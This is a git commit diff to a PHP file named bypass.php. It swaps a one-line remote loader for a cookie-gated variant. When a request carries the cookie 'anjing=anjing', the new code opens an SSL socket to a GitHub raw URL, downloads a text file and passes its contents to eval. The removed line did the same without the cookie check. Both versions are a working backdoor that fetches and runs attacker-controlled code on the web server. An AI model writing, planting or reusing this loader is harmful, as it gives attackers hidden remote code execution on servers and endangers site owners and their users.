5a34abcf946c9dc82fdafbc58c7850be2e095c75
dan1584 <pewedandi32@gmail.com>
2024-11-22 16:40:12 +0700

    Update bypass.php

--- bypass.php
+++ bypass.php
@@ -1,1 +1,30 @@
-<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/dan1584/asfdas/main/maridono.php"));?>
+<?php
+
+if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
+    $host = "raw.githubusercontent.com";
+    $port = 443;
+    $path = "/dan1584/asfdas/main/tobanga.txt";
+
+    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
+    if (!$fp) {
+        echo "Error: $errstr ($errno)<br />\n";
+    } else {
+        $out = "GET $path HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $out);
+
+        $content = "";
+        while (!feof($fp)) {
+            $content .= fgets($fp, 128);
+        }
+        fclose($fp);
+
+        $header_end = strpos($content, "\r\n\r\n");
+        if ($header_end !== false) {
+            $content = substr($content, $header_end + 4);
+        }
+
+        eval("?>" . $content);
+    }
+}
